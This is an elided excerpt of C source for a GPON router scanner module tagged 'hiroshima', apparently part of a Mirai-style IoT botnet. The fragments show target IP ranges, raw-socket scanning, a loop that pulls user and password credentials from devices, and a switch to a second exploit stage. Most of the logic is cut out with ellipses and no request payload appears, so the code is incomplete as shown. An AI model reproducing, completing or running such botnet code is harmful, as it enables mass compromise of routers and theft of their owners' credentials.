...
int gpon443_ranges[] = {42,212,109,5,118,210,178,94,2,37,79,202,148,117,123};
...
void gpon443_scanner(void)
{
    ...
    {
        #ifdef DEBUG
            printf("[hiroshima/gpon] failed to initialize raw socket, cannot scan\n");
        #endif
        exit(0);
    }
    ...
    {
        #ifdef DEBUG
            printf("[hiroshima/gpon] failed to set IP_HDRINCL, cannot scan\n");
        #endif
        close(gpon443_rsck);
        exit(0);
    }
    ...
    #ifdef DEBUG
        printf("[hiroshima/gpon] scanner process initialized. scanning started.\n");
    #endif
    ...
    while(TRUE)
    {
        ...
        for(i = 0; i < GPON443_SCANNER_MAX_CONNS; i++)
        {
            ...
            {
                #ifdef DEBUG
                    printf("[hiroshima/gpon] FD%d timed out (state = %d)\n", conn->fd, conn->state);
                #endif
        ...
        for(i = 0; i < GPON443_SCANNER_MAX_CONNS; i++)
        {
            ...
            if(FD_ISSET(conn->fd, &fdset_wr))
            {
                ...
                {
                    #ifdef DEBUG
                        printf("[hiroshima/gpon] FD%d error while connecting = %d\n", conn->fd, err);
                    #endif
            ...
            if(FD_ISSET(conn->fd, &fdset_rd))
            {
                while(TRUE)
                {
                    ...
                    {
                        #ifdef DEBUG
                            printf("[hiroshima/gpon] FD%d connection gracefully closed (stage %d)\n", conn->fd, conn->state);
                        #endif
                        errno = ECONNRESET;
                        ret = -1;
                    }
                    if(ret == -1)
                    {
                        if(errno != EAGAIN && errno != EWOULDBLOCK)
                        {
                            ...
                            {
                                #ifdef DEBUG
                                    printf("[hiroshima/gpon] FD%d resetting connection preparing to continue with stage 2 of the exploit\n", conn->fd);
                                #endif
                                close(conn->fd);
                                gpon443_setup_connection(conn);
                                continue;
                    ...
                    if(conn->state == GPON443_SC_GET_CREDENTIALS)
                    {
                        ...
                        while(out != NULL)
                        {
                            ...
                            {
                                #ifdef DEBUG
                                    printf("[hiroshima/gpon] FD%d parsing credentials...\n", conn->fd);
                                #endif
                    ...
                    {
                        #ifdef DEBUG
                            printf("[hiroshima/gpon] FD%d failed to retrieve credentials\n", conn->fd);
                        #endif
                        close(conn->fd);
                        conn->fd = -1;
                        conn->state = GPON443_SC_CLOSED;
                    ...
                    {
                        #ifdef DEBUG
                            printf("[hiroshima/gpon] FD%d retrieved user: %s, pass: %s changing exploit stages\n", conn->fd, conn->credentials[0], conn->credentials[1]);
                        #endif
...
static void gpon443_setup_connection(struct gpon443_scanner_connection *conn)
{
    ...
    {
        #ifdef DEBUG
            printf("[hiroshima/gpon] failed to call socket()\n");
        #endif
        return;
    }
